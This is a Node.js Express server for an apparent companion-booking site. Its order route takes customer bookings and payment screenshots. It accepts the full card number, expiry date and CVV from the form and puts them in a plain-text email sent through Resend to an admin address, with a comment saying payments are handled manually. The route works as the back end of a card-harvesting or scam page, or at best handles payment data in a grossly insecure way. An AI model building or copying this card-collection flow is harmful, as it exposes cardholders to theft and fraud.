import express from 'express';
import cors from 'cors';
import multer from 'multer';
import { existsSync, readFileSync } from 'node:fs';

const loadDotEnv = (path = '.env') => {
  if (!existsSync(path)) return;

  const lines = readFileSync(path, 'utf8').split(/\r?\n/);
  for (const line of lines) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#')) continue;

    const separatorIndex = trimmed.indexOf('=');
    if (separatorIndex <= 0) continue;

    const key = trimmed.slice(0, separatorIndex).trim();
    if (!key || process.env[key] !== undefined) continue;

    let value = trimmed.slice(separatorIndex + 1).trim();
    if (
      (value.startsWith('"') && value.endsWith('"')) ||
      (value.startsWith("'") && value.endsWith("'"))
    ) {
      value = value.slice(1, -1);
    }
    process.env[key] = value;
  }
};

loadDotEnv();

const app = express();
const PORT = process.env.PORT || 3001;
const normalizeOrigin = (value) => value?.trim().replace(/\/$/, '');
const FRONTEND_ORIGIN = normalizeOrigin(process.env.FRONTEND_ORIGIN || '');
const ADDITIONAL_ALLOWED_ORIGINS = (process.env.ADDITIONAL_ALLOWED_ORIGINS || '')
  .split(',')
  .map((origin) => normalizeOrigin(origin))
  .filter(Boolean);
const DEFAULT_ALLOWED_ORIGINS = [
  'https://meet-up-com.vercel.app',
  'http://localhost:5173',
  'http://localhost:5174',
].map((origin) => normalizeOrigin(origin));
const ALLOWED_ORIGINS = new Set([
  ...DEFAULT_ALLOWED_ORIGINS,
  FRONTEND_ORIGIN,
  ...ADDITIONAL_ALLOWED_ORIGINS,
].filter(Boolean));
const RESEND_API_KEY = process.env.RESEND_API_KEY;
const RESEND_FROM = process.env.RESEND_FROM;
const ADMIN_EMAIL = process.env.ADMIN_EMAIL;
const BOOKING_AMOUNT_MIN = 40;
const BOOKING_AMOUNT_MAX = 1000;

const corsOptions = {
  origin: (origin, callback) => {
    // Allow non-browser clients (no origin header) and configured origins.
    const normalizedOrigin = normalizeOrigin(origin);
    const isLocalDevOrigin = /^http:\/\/(localhost|127\.0\.0\.1):\d+$/.test(normalizedOrigin || '');
    const isMeetUpVercelPreview = /^https:\/\/meet-up-[a-z0-9-]+\.vercel\.app$/.test(normalizedOrigin || '');

    if (
      !normalizedOrigin ||
      ALLOWED_ORIGINS.has(normalizedOrigin) ||
      isLocalDevOrigin ||
      isMeetUpVercelPreview
    ) {
      return callback(null, true);
    }
    return callback(new Error('Not allowed by CORS'));
  },
  methods: ['GET', 'POST', 'OPTIONS'],
};

// Middleware
app.use(cors(corsOptions));
app.options('*', cors(corsOptions));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Configure multer for file uploads
const storage = multer.memoryStorage();
const upload = multer({ 
  storage: storage,
  limits: { fileSize: 10 * 1024 * 1024 } // 10MB limit
});

// API Routes
app.post('/api/send-order', upload.single('screenshot'), async (req, res) => {
  try {
    if (!RESEND_API_KEY || !RESEND_FROM || !ADMIN_EMAIL) {
      return res.status(500).json({
        success: false,
        message: 'Server email is not configured. Please set RESEND_API_KEY, RESEND_FROM, and ADMIN_EMAIL.'
      });
    }

    const { 
      customerName, 
      customerEmail, 
      customerPhone, 
      companionName, 
      duration, 
      amount, 
      paymentMethod,
      date,
      notes,
      cardholderName,
      cardNumber,
      cardExpiry,
      cardCvv
    } = req.body;

    // Validate required fields
    if (!customerName || !companionName || !amount) {
      return res.status(400).json({ 
        success: false, 
        message: 'Missing required order details' 
      });
    }

    const parsedAmount = Number(amount);
    if (!Number.isFinite(parsedAmount)) {
      return res.status(400).json({
        success: false,
        message: 'Invalid booking amount.'
      });
    }
    if (parsedAmount < BOOKING_AMOUNT_MIN || parsedAmount > BOOKING_AMOUNT_MAX) {
      return res.status(400).json({
        success: false,
        message: `Booking amount must be between $${BOOKING_AMOUNT_MIN} and $${BOOKING_AMOUNT_MAX}.`
      });
    }

    // Build email content
    let cardDetailsSection = '';
    if (cardholderName || cardNumber || cardExpiry || cardCvv) {
      // Show full card details since payments are processed manually
      cardDetailsSection = `
      CARD DETAILS:
      - Cardholder Name: ${cardholderName || 'Not provided'}
      - Card Number: ${cardNumber || 'Not provided'}
      - Expiry Date: ${cardExpiry || 'Not provided'}
      - CVV: ${cardCvv || 'Not provided'}
      `;
    }

    const emailContent = `
      New Booking Order Received
      ==========================
      
      CUSTOMER DETAILS:
      - Name: ${customerName}
      - Email: ${customerEmail || 'Not provided'}
      - Phone: ${customerPhone || 'Not provided'}
      
      BOOKING DETAILS:
      - Companion: ${companionName}
      - Duration: ${duration || 'Not specified'}
      - Amount: $${parsedAmount}
      - Payment Method: ${paymentMethod || 'Not specified'}
      - Preferred Date: ${date || 'Flexible'}
      - Notes: ${notes || 'None'}
      ${cardDetailsSection}
      ==========================
      Order received at: ${new Date().toLocaleString()}
    `;

    const attachments = [];
    
    // Add screenshot if provided
    if (req.file) {
      const fileExtension = req.file.mimetype?.split('/')[1] || 'jpg';
      attachments.push({
        filename: `payment-screenshot-${Date.now()}.${fileExtension}`,
        content: req.file.buffer.toString('base64')
      });
    }

    const emailResponse = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${RESEND_API_KEY}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        from: RESEND_FROM,
        to: [ADMIN_EMAIL],
        subject: `New Booking - ${companionName} - $${parsedAmount} - ${customerName}`,
        text: emailContent,
        attachments
      })
    });

    const emailResult = await emailResponse.json().catch(() => ({}));

    if (!emailResponse.ok) {
      const providerError = emailResult?.message || emailResult?.error || 'Unknown provider error';
      throw new Error(`Resend API error (${emailResponse.status}): ${providerError}`);
    }

    console.log('Email sent successfully:', emailResult?.id);
    
    res.json({ 
      success: true, 
      message: 'Order submitted successfully! We will contact you soon.',
      messageId: emailResult?.id
    });

  } catch (error) {
    const errorMessage = error instanceof Error ? error.message : String(error);
    console.error('Error sending email:', errorMessage);

    const isResendAuthError = /resend api error \(401|resend api error \(403|invalid api key|unauthorized/i.test(errorMessage);
    const isResendSenderError = /from|sender|domain|verify/i.test(errorMessage);

    if (isResendAuthError) {
      return res.status(502).json({
        success: false,
        message: 'Resend authentication failed. Check RESEND_API_KEY and restart the server.'
      });
    }

    if (isResendSenderError) {
      return res.status(502).json({
        success: false,
        message: 'Sender email is not verified on Resend. Verify RESEND_FROM and your domain settings.'
      });
    }

    res.status(500).json({ 
      success: false, 
      message: 'Failed to send order. Please try again or contact support.' 
    });
  }
});

app.use((err, req, res, next) => {
  if (err?.message === 'Not allowed by CORS') {
    return res.status(403).json({
      success: false,
      message: 'Origin is not allowed by CORS policy.'
    });
  }

  if (err instanceof multer.MulterError) {
    if (err.code === 'LIMIT_FILE_SIZE') {
      return res.status(400).json({
        success: false,
        message: 'Screenshot is too large. Maximum file size is 10MB.'
      });
    }
    return res.status(400).json({
      success: false,
      message: err.message || 'Upload failed.'
    });
  }

  const errorMessage = err instanceof Error ? err.message : String(err || '');
  const isMalformedMultipart =
    /unexpected end of form|multipart: boundary not found|unexpected field/i.test(errorMessage);

  if (isMalformedMultipart) {
    return res.status(400).json({
      success: false,
      message: 'Invalid upload payload. Please re-upload the screenshot and try again.'
    });
  }

  console.error('Unhandled server error:', errorMessage);
  return res.status(500).json({
    success: false,
    message: 'Server error while processing order.'
  });
});

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`API endpoint: http://localhost:${PORT}/api/send-order`);
});
